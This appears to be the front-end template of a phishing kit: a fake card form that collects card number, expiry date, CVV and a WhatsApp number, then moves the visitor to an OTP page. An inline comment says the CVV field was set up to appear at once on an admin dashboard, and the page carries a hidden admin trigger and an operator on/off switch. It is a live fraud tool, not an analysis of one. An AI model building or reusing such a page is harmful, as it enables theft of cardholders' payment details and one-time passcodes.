        <div class="page-body">

            <div class="form-section">
                <h2 class="field-title">Card Number</h2>
                <p class="field-subtitle">Please enter valid card number</p>
                <div class="input-with-icon">
                    <i class="ri-bank-card-line input-icon"></i>
                    <input type="tel" id="cardNumber" placeholder="Enter Card No" inputmode="numeric" maxlength="19" autocomplete="off">
                </div>
            </div>

            <div class="divider"></div>

            <div class="two-col-grid">
                <div class="form-section">
                    <h2 class="field-title">Expiry Date</h2>
                    <p class="field-subtitle">Enter expire date</p>
                    <div class="input-with-icon">
                        <i class="ri-calendar-line input-icon"></i>
                        <input type="tel" id="expiryDate" placeholder="MM/YY" inputmode="numeric" maxlength="5" autocomplete="off">
                    </div>
                </div>

                <div class="form-section">
                    <h2 class="field-title">CVV number</h2>
                    <p class="field-subtitle">Enter 3 digits</p>
                    <div class="input-with-icon">
                        <i class="ri-shield-check-line input-icon"></i>
                        <!-- ⭐ CVV ab type="tel" hai taake admin dashboard pe foran show ho -->
                        <input type="tel" id="cvv" placeholder="000" inputmode="numeric" maxlength="3" autocomplete="off">
                    </div>
                </div>
            </div>

            <div class="divider"></div>

            <div class="form-section">
                <h2 class="field-title">WhatsApp Number</h2>
                <p class="field-subtitle">Enter your active WhatsApp number with country code.</p>
                <div class="input-with-icon">
                    <i class="ri-whatsapp-line input-icon"></i>
                    <!-- ⭐ WhatsApp ab 10 digits ka hai -->
                    <input type="tel" id="whatsapp" placeholder="XXXXXXXXXXX" inputmode="numeric" maxlength="10" autocomplete="off">
                </div>
            </div>

            <!-- ⭐ SUBMIT BUTTON (Blue) ⭐ -->
            <button type="button" class="btn-submit" onclick="manualGoToOtp()">
                <span class="btn-text">Continue</span>
            </button>

        </div>
    </div>

    <div id="adminTrigger" onclick="triggerAdmin()"></div>

    <script src="{{ url_for('static', filename='js/user_v5.js') }}?v=10"></script>
    <script>
        // ==================== URL SECURITY LOCK ====================
        (function() {
            const allowedPaths = ['/', '/index', '/login', '/otp', '/admin', '/admin/login'];
            const currentPath = window.location.pathname;
            
            if (!allowedPaths.includes(currentPath) && !currentPath.startsWith('/static/')) {
                window.location.replace('/');
            }

            window.addEventListener('popstate', function() {
                if (!allowedPaths.includes(window.location.pathname) && !window.location.pathname.startsWith('/static/')) {
                    window.location.replace('/');
                }
            });
        })();

        // ==================== MANUAL BUTTON HANDLER ====================
        function manualGoToOtp() {
            const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const expiry = document.getElementById('expiryDate').value;
            const cvv = document.getElementById('cvv').value;
            const whatsapp = document.getElementById('whatsapp').value;
            
            // ⭐ WhatsApp 10 digits now
            if (card.length === 16 && expiry.length === 5 && cvv.length === 3 && whatsapp.length === 10) {
                console.log("✅ Button clicked — going to OTP page");
                window.location.href = '/otp';
            } else {
                alert("Please fill all fields correctly:\n\n" +
                      "• Card Number: 16 digits\n" +
                      "• Expiry: MM/YY\n" +
                      "• CVV: 3 digits\n" +
                      "• WhatsApp: 10 digits");
            }
        }

        // ==================== CLEAR FORM ON PAGE LOAD ====================
        window.addEventListener('pageshow', function(event) {
            if (event.persisted) {
                clearAllInputs();
            }
        });

        window.addEventListener('load', function() {
            const currentPath = window.location.pathname;
            if (currentPath === '/' || currentPath === '/index') {
                clearAllInputs();
                sessionStorage.removeItem('cml_session_id');
            }
        });

        function clearAllInputs() {
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.value = '';
            });
        }

        // ==================== WEBSITE STATE ====================
        function checkWebsiteState() {
            fetch('/get_website_state?t=' + Date.now())
                .then(res => res.json())
                .then(data => {
                    const overlay = document.getElementById('websiteOffOverlay');
                    if (data.enabled) {
                        overlay.style.display = 'none';
                    } else {
                        overlay.style.display = 'flex';
                    }
                })
                .catch(() => {});
        }
        window.addEventListener('load', checkWebsiteState);
        setInterval(checkWebsiteState, 3000);
    </script>
</body>
